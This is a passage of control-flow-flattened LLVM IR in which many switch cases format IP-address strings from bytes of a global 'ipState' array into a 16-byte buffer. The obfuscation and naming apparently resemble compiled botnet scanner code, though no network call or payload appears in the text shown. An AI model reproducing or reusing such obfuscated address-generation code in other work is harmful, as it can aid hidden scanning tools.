  %898 = icmp eq i32 %897, 80
  %899 = select i1 %898, i32 -1658777495, i32 1332924232
  store i32 %899, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
  %901 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %902 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %903 = zext i8 %902 to i32
  %904 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %905 = zext i8 %904 to i32
  %906 = call i32 (i8*, i8*, ...) @szprintf(i8* %901, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.265, i32 0, i32 0), i32 %903, i32 %905)
  store i32 1332924232, i32* %switchVar
  br label %loopEnd

; <label>:907:                                    ; preds = %loopEntry
  %908 = load i32, i32* %1, align 4
  %909 = icmp eq i32 %908, 81
  %910 = select i1 %909, i32 1986894346, i32 963720190
  store i32 %910, i32* %switchVar
  br label %loopEnd

; <label>:911:                                    ; preds = %loopEntry
  %912 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %913 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %914 = zext i8 %913 to i32
  %915 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %916 = zext i8 %915 to i32
  %917 = call i32 (i8*, i8*, ...) @szprintf(i8* %912, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.266, i32 0, i32 0), i32 %914, i32 %916)
  store i32 963720190, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i32, i32* %1, align 4
  %920 = icmp eq i32 %919, 82
  %921 = select i1 %920, i32 -1151477389, i32 571135885
  store i32 %921, i32* %switchVar
  br label %loopEnd

; <label>:922:                                    ; preds = %loopEntry
  %923 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %924 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %925 = zext i8 %924 to i32
  %926 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %927 = zext i8 %926 to i32
  %928 = call i32 (i8*, i8*, ...) @szprintf(i8* %923, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.267, i32 0, i32 0), i32 %925, i32 %927)
  store i32 571135885, i32* %switchVar
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  %930 = load i32, i32* %1, align 4
  %931 = icmp eq i32 %930, 83
  %932 = select i1 %931, i32 1494602009, i32 -1842531561
  store i32 %932, i32* %switchVar
  br label %loopEnd

; <label>:933:                                    ; preds = %loopEntry
  %934 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %935 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %936 = zext i8 %935 to i32
  %937 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %938 = zext i8 %937 to i32
  %939 = call i32 (i8*, i8*, ...) @szprintf(i8* %934, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.268, i32 0, i32 0), i32 %936, i32 %938)
  store i32 -1842531561, i32* %switchVar
  br label %loopEnd

; <label>:940:                                    ; preds = %loopEntry
  %941 = load i32, i32* %1, align 4
  %942 = icmp eq i32 %941, 84
  %943 = select i1 %942, i32 1084986993, i32 -2021227022
  store i32 %943, i32* %switchVar
  br label %loopEnd

; <label>:944:                                    ; preds = %loopEntry
  %945 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %946 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %947 = zext i8 %946 to i32
  %948 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %949 = zext i8 %948 to i32
  %950 = call i32 (i8*, i8*, ...) @szprintf(i8* %945, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.269, i32 0, i32 0), i32 %947, i32 %949)
  store i32 -2021227022, i32* %switchVar
  br label %loopEnd

; <label>:951:                                    ; preds = %loopEntry
  %952 = load i32, i32* %1, align 4
  %953 = icmp eq i32 %952, 85
  %954 = select i1 %953, i32 -1320815300, i32 1950065096
  store i32 %954, i32* %switchVar
  br label %loopEnd

; <label>:955:                                    ; preds = %loopEntry
  %956 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %957 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %958 = zext i8 %957 to i32
  %959 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %960 = zext i8 %959 to i32
  %961 = call i32 (i8*, i8*, ...) @szprintf(i8* %956, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.270, i32 0, i32 0), i32 %958, i32 %960)
  store i32 1950065096, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  %963 = load i32, i32* %1, align 4
  %964 = icmp eq i32 %963, 86
  %965 = select i1 %964, i32 164151286, i32 1818643536
  store i32 %965, i32* %switchVar
  br label %loopEnd

; <label>:966:                                    ; preds = %loopEntry
  %967 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %968 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %969 = zext i8 %968 to i32
  %970 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %971 = zext i8 %970 to i32
  %972 = call i32 (i8*, i8*, ...) @szprintf(i8* %967, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.271, i32 0, i32 0), i32 %969, i32 %971)
  store i32 1818643536, i32* %switchVar
  br label %loopEnd

; <label>:973:                                    ; preds = %loopEntry
  %974 = load i32, i32* %1, align 4
  %975 = icmp eq i32 %974, 87
  %976 = select i1 %975, i32 -727246971, i32 -1469716526
  store i32 %976, i32* %switchVar
  br label %loopEnd

; <label>:977:                                    ; preds = %loopEntry
  %978 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %979 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %980 = zext i8 %979 to i32
  %981 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %982 = zext i8 %981 to i32
  %983 = call i32 (i8*, i8*, ...) @szprintf(i8* %978, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.272, i32 0, i32 0), i32 %980, i32 %982)
  store i32 -1469716526, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load i32, i32* %1, align 4
  %986 = icmp eq i32 %985, 88
  %987 = select i1 %986, i32 -447300429, i32 -1392299618
  store i32 %987, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  %989 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %990 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %991 = zext i8 %990 to i32
  %992 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %993 = zext i8 %992 to i32
  %994 = call i32 (i8*, i8*, ...) @szprintf(i8* %989, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.273, i32 0, i32 0), i32 %991, i32 %993)
  store i32 -1392299618, i32* %switchVar
  br label %loopEnd

; <label>:995:                                    ; preds = %loopEntry
  %996 = load i32, i32* %1, align 4
  %997 = icmp eq i32 %996, 89
  %998 = select i1 %997, i32 939254275, i32 -241537202
  store i32 %998, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  %1000 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1001 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1002 = zext i8 %1001 to i32
  %1003 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1004 = zext i8 %1003 to i32
  %1005 = call i32 (i8*, i8*, ...) @szprintf(i8* %1000, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.274, i32 0, i32 0), i32 %1002, i32 %1004)
  store i32 -241537202, i32* %switchVar
  br label %loopEnd

; <label>:1006:                                   ; preds = %loopEntry
  %1007 = load i32, i32* %1, align 4
  %1008 = icmp eq i32 %1007, 90
  %1009 = select i1 %1008, i32 -722921825, i32 1693687573
  store i32 %1009, i32* %switchVar
  br label %loopEnd

; <label>:1010:                                   ; preds = %loopEntry
  %1011 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1012 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1013 = zext i8 %1012 to i32
  %1014 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1015 = zext i8 %1014 to i32
  %1016 = call i32 (i8*, i8*, ...) @szprintf(i8* %1011, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.275, i32 0, i32 0), i32 %1013, i32 %1015)
  store i32 1693687573, i32* %switchVar
  br label %loopEnd

; <label>:1017:                                   ; preds = %loopEntry
  %1018 = load i32, i32* %1, align 4
  %1019 = icmp eq i32 %1018, 91
  %1020 = select i1 %1019, i32 -1985123247, i32 2026228661
  store i32 %1020, i32* %switchVar
  br label %loopEnd

; <label>:1021:                                   ; preds = %loopEntry
  %1022 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1023 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1024 = zext i8 %1023 to i32
  %1025 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1026 = zext i8 %1025 to i32
  %1027 = call i32 (i8*, i8*, ...) @szprintf(i8* %1022, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.276, i32 0, i32 0), i32 %1024, i32 %1026)
  store i32 2026228661, i32* %switchVar
  br label %loopEnd

; <label>:1028:                                   ; preds = %loopEntry
  %1029 = load i32, i32* %1, align 4
  %1030 = icmp eq i32 %1029, 92
  %1031 = select i1 %1030, i32 891698106, i32 -1408904947
  store i32 %1031, i32* %switchVar
  br label %loopEnd

; <label>:1032:                                   ; preds = %loopEntry
  %1033 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1034 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1035 = zext i8 %1034 to i32
  %1036 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1037 = zext i8 %1036 to i32
  %1038 = call i32 (i8*, i8*, ...) @szprintf(i8* %1033, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.277, i32 0, i32 0), i32 %1035, i32 %1037)
  store i32 -1408904947, i32* %switchVar
  br label %loopEnd

; <label>:1039:                                   ; preds = %loopEntry
  %1040 = load i32, i32* %1, align 4
  %1041 = icmp eq i32 %1040, 93
  %1042 = select i1 %1041, i32 397096643, i32 1192287599
  store i32 %1042, i32* %switchVar
  br label %loopEnd

; <label>:1043:                                   ; preds = %loopEntry
  %1044 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1045 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1046 = zext i8 %1045 to i32
  %1047 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1048 = zext i8 %1047 to i32
  %1049 = call i32 (i8*, i8*, ...) @szprintf(i8* %1044, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.278, i32 0, i32 0), i32 %1046, i32 %1048)
  store i32 1192287599, i32* %switchVar
  br label %loopEnd

; <label>:1050:                                   ; preds = %loopEntry
  %1051 = load i32, i32* %1, align 4
  %1052 = icmp eq i32 %1051, 94
  %1053 = select i1 %1052, i32 428598063, i32 293595338
  store i32 %1053, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1056 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1057 = zext i8 %1056 to i32
  %1058 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1059 = zext i8 %1058 to i32
  %1060 = call i32 (i8*, i8*, ...) @szprintf(i8* %1055, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.279, i32 0, i32 0), i32 %1057, i32 %1059)
  store i32 293595338, i32* %switchVar
  br label %loopEnd

; <label>:1061:                                   ; preds = %loopEntry
  %1062 = load i32, i32* %1, align 4
  %1063 = icmp eq i32 %1062, 95
  %1064 = select i1 %1063, i32 1759316675, i32 -381038726
  store i32 %1064, i32* %switchVar
  br label %loopEnd

; <label>:1065:                                   ; preds = %loopEntry
  %1066 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1067 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1068 = zext i8 %1067 to i32
  %1069 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1070 = zext i8 %1069 to i32
  %1071 = call i32 (i8*, i8*, ...) @szprintf(i8* %1066, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.280, i32 0, i32 0), i32 %1068, i32 %1070)
  store i32 -381038726, i32* %switchVar
  br label %loopEnd

; <label>:1072:                                   ; preds = %loopEntry
  %1073 = load i32, i32* %1, align 4
  %1074 = icmp eq i32 %1073, 96
  %1075 = select i1 %1074, i32 288551433, i32 -1939297690
  store i32 %1075, i32* %switchVar
  br label %loopEnd

; <label>:1076:                                   ; preds = %loopEntry
  %1077 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1078 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1079 = zext i8 %1078 to i32
  %1080 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1081 = zext i8 %1080 to i32
  %1082 = call i32 (i8*, i8*, ...) @szprintf(i8* %1077, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.281, i32 0, i32 0), i32 %1079, i32 %1081)
  store i32 -1939297690, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  %1084 = load i32, i32* %1, align 4
  %1085 = icmp eq i32 %1084, 97
  %1086 = select i1 %1085, i32 1588894693, i32 164805517
  store i32 %1086, i32* %switchVar
  br label %loopEnd

; <label>:1087:                                   ; preds = %loopEntry
  %1088 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1089 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1090 = zext i8 %1089 to i32
  %1091 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1092 = zext i8 %1091 to i32
  %1093 = call i32 (i8*, i8*, ...) @szprintf(i8* %1088, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.282, i32 0, i32 0), i32 %1090, i32 %1092)
  store i32 164805517, i32* %switchVar
  br label %loopEnd

; <label>:1094:                                   ; preds = %loopEntry
  %1095 = load i32, i32* %1, align 4
  %1096 = icmp eq i32 %1095, 98
  %1097 = select i1 %1096, i32 -446177082, i32 -1255510513
  store i32 %1097, i32* %switchVar
  br label %loopEnd

; <label>:1098:                                   ; preds = %loopEntry
  %1099 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1100 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1101 = zext i8 %1100 to i32
  %1102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1103 = zext i8 %1102 to i32
  %1104 = call i32 (i8*, i8*, ...) @szprintf(i8* %1099, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.283, i32 0, i32 0), i32 %1101, i32 %1103)
  store i32 -1255510513, i32* %switchVar
  br label %loopEnd

; <label>:1105:                                   ; preds = %loopEntry
  %1106 = load i32, i32* %1, align 4
  %1107 = icmp eq i32 %1106, 99
  %1108 = select i1 %1107, i32 918460737, i32 61277403
  store i32 %1108, i32* %switchVar
  br label %loopEnd

; <label>:1109:                                   ; preds = %loopEntry
  %1110 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1112 = zext i8 %1111 to i32
  %1113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1114 = zext i8 %1113 to i32
  %1115 = call i32 (i8*, i8*, ...) @szprintf(i8* %1110, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.284, i32 0, i32 0), i32 %1112, i32 %1114)
  store i32 61277403, i32* %switchVar
  br label %loopEnd

; <label>:1116:                                   ; preds = %loopEntry
  %1117 = load i32, i32* %1, align 4
  %1118 = icmp eq i32 %1117, 100
  %1119 = select i1 %1118, i32 1957405589, i32 -1072293890
  store i32 %1119, i32* %switchVar
  br label %loopEnd

; <label>:1120:                                   ; preds = %loopEntry
  %1121 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1123 = zext i8 %1122 to i32
  %1124 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1125 = zext i8 %1124 to i32
  %1126 = call i32 (i8*, i8*, ...) @szprintf(i8* %1121, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.285, i32 0, i32 0), i32 %1123, i32 %1125)
  store i32 -1072293890, i32* %switchVar
  br label %loopEnd

; <label>:1127:                                   ; preds = %loopEntry
  %1128 = load i32, i32* %1, align 4
  %1129 = icmp eq i32 %1128, 101
  %1130 = select i1 %1129, i32 -1949814277, i32 -1299689320
  store i32 %1130, i32* %switchVar
  br label %loopEnd

; <label>:1131:                                   ; preds = %loopEntry
  %1132 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1134 = zext i8 %1133 to i32
  %1135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1136 = zext i8 %1135 to i32
  %1137 = call i32 (i8*, i8*, ...) @szprintf(i8* %1132, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.286, i32 0, i32 0), i32 %1134, i32 %1136)
  store i32 -1299689320, i32* %switchVar
  br label %loopEnd

; <label>:1138:                                   ; preds = %loopEntry
  %1139 = load i32, i32* %1, align 4
  %1140 = icmp eq i32 %1139, 102
  %1141 = select i1 %1140, i32 -1366821756, i32 -1149617937
  store i32 %1141, i32* %switchVar
  br label %loopEnd

; <label>:1142:                                   ; preds = %loopEntry
  %1143 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1144 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1145 = zext i8 %1144 to i32
  %1146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1147 = zext i8 %1146 to i32
  %1148 = call i32 (i8*, i8*, ...) @szprintf(i8* %1143, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.287, i32 0, i32 0), i32 %1145, i32 %1147)
  store i32 -1149617937, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i32, i32* %1, align 4
  %1151 = icmp eq i32 %1150, 103
  %1152 = select i1 %1151, i32 905148499, i32 1359923823
  store i32 %1152, i32* %switchVar
  br label %loopEnd

; <label>:1153:                                   ; preds = %loopEntry
  %1154 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1155 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1156 = zext i8 %1155 to i32
  %1157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1158 = zext i8 %1157 to i32
  %1159 = call i32 (i8*, i8*, ...) @szprintf(i8* %1154, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.288, i32 0, i32 0), i32 %1156, i32 %1158)
  store i32 1359923823, i32* %switchVar
  br label %loopEnd

; <label>:1160:                                   ; preds = %loopEntry
  %1161 = load i32, i32* %1, align 4
  %1162 = icmp eq i32 %1161, 104
  %1163 = select i1 %1162, i32 -1415606503, i32 -109065688
  store i32 %1163, i32* %switchVar
  br label %loopEnd

; <label>:1164:                                   ; preds = %loopEntry
  %1165 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1167 = zext i8 %1166 to i32
  %1168 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1169 = zext i8 %1168 to i32
  %1170 = call i32 (i8*, i8*, ...) @szprintf(i8* %1165, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.289, i32 0, i32 0), i32 %1167, i32 %1169)
  store i32 -109065688, i32* %switchVar
  br label %loopEnd

; <label>:1171:                                   ; preds = %loopEntry
  %1172 = load i32, i32* %1, align 4
  %1173 = icmp eq i32 %1172, 105
  %1174 = select i1 %1173, i32 1791888716, i32 188322268
  store i32 %1174, i32* %switchVar
  br label %loopEnd

; <label>:1175:                                   ; preds = %loopEntry
  %1176 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1178 = zext i8 %1177 to i32
  %1179 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1180 = zext i8 %1179 to i32
  %1181 = call i32 (i8*, i8*, ...) @szprintf(i8* %1176, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.290, i32 0, i32 0), i32 %1178, i32 %1180)
  store i32 188322268, i32* %switchVar
  br label %loopEnd

; <label>:1182:                                   ; preds = %loopEntry
  %1183 = load i32, i32* %1, align 4
  %1184 = icmp eq i32 %1183, 106
  %1185 = select i1 %1184, i32 1063443420, i32 883426139
  store i32 %1185, i32* %switchVar
  br label %loopEnd

; <label>:1186:                                   ; preds = %loopEntry
  %1187 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1189 = zext i8 %1188 to i32
  %1190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1191 = zext i8 %1190 to i32
  %1192 = call i32 (i8*, i8*, ...) @szprintf(i8* %1187, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.291, i32 0, i32 0), i32 %1189, i32 %1191)
  store i32 883426139, i32* %switchVar
  br label %loopEnd

; <label>:1193:                                   ; preds = %loopEntry
  %1194 = load i32, i32* %1, align 4
  %1195 = icmp eq i32 %1194, 107
  %1196 = select i1 %1195, i32 -857950788, i32 2059112129
  store i32 %1196, i32* %switchVar
  br label %loopEnd

; <label>:1197:                                   ; preds = %loopEntry
  %1198 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1199 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1200 = zext i8 %1199 to i32
  %1201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1202 = zext i8 %1201 to i32
  %1203 = call i32 (i8*, i8*, ...) @szprintf(i8* %1198, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.292, i32 0, i32 0), i32 %1200, i32 %1202)
  store i32 2059112129, i32* %switchVar
  br label %loopEnd

; <label>:1204:                                   ; preds = %loopEntry
  %1205 = load i32, i32* %1, align 4
  %1206 = icmp eq i32 %1205, 108
  %1207 = select i1 %1206, i32 -641429861, i32 -53038305
  store i32 %1207, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  %1209 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1210 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1211 = zext i8 %1210 to i32
  %1212 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1213 = zext i8 %1212 to i32
  %1214 = call i32 (i8*, i8*, ...) @szprintf(i8* %1209, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.293, i32 0, i32 0), i32 %1211, i32 %1213)
  store i32 -53038305, i32* %switchVar
  br label %loopEnd

; <label>:1215:                                   ; preds = %loopEntry
  %1216 = load i32, i32* %1, align 4
  %1217 = icmp eq i32 %1216, 109
  %1218 = select i1 %1217, i32 403380414, i32 -1738094464
  store i32 %1218, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1222 = zext i8 %1221 to i32
  %1223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1224 = zext i8 %1223 to i32
  %1225 = call i32 (i8*, i8*, ...) @szprintf(i8* %1220, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.294, i32 0, i32 0), i32 %1222, i32 %1224)
  store i32 -1738094464, i32* %switchVar
  br label %loopEnd

; <label>:1226:                                   ; preds = %loopEntry
  %1227 = load i32, i32* %1, align 4
  %1228 = icmp eq i32 %1227, 110
  %1229 = select i1 %1228, i32 939723855, i32 29192734
  store i32 %1229, i32* %switchVar
  br label %loopEnd

; <label>:1230:                                   ; preds = %loopEntry
  %1231 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1232 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1233 = zext i8 %1232 to i32
  %1234 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1235 = zext i8 %1234 to i32
  %1236 = call i32 (i8*, i8*, ...) @szprintf(i8* %1231, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.295, i32 0, i32 0), i32 %1233, i32 %1235)
  store i32 29192734, i32* %switchVar
  br label %loopEnd

; <label>:1237:                                   ; preds = %loopEntry
  %1238 = load i32, i32* %1, align 4
  %1239 = icmp eq i32 %1238, 111
  %1240 = select i1 %1239, i32 927540982, i32 -1166129422
  store i32 %1240, i32* %switchVar
  br label %loopEnd

; <label>:1241:                                   ; preds = %loopEntry
  %1242 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1244 = zext i8 %1243 to i32
  %1245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1246 = zext i8 %1245 to i32
  %1247 = call i32 (i8*, i8*, ...) @szprintf(i8* %1242, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.296, i32 0, i32 0), i32 %1244, i32 %1246)
  store i32 -1166129422, i32* %switchVar
  br label %loopEnd

; <label>:1248:                                   ; preds = %loopEntry
  %1249 = load i32, i32* %1, align 4
  %1250 = icmp eq i32 %1249, 112
  %1251 = select i1 %1250, i32 -697707696, i32 -913910694
  store i32 %1251, i32* %switchVar
  br label %loopEnd

; <label>:1252:                                   ; preds = %loopEntry
  %1253 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1254 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1255 = zext i8 %1254 to i32
  %1256 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1257 = zext i8 %1256 to i32
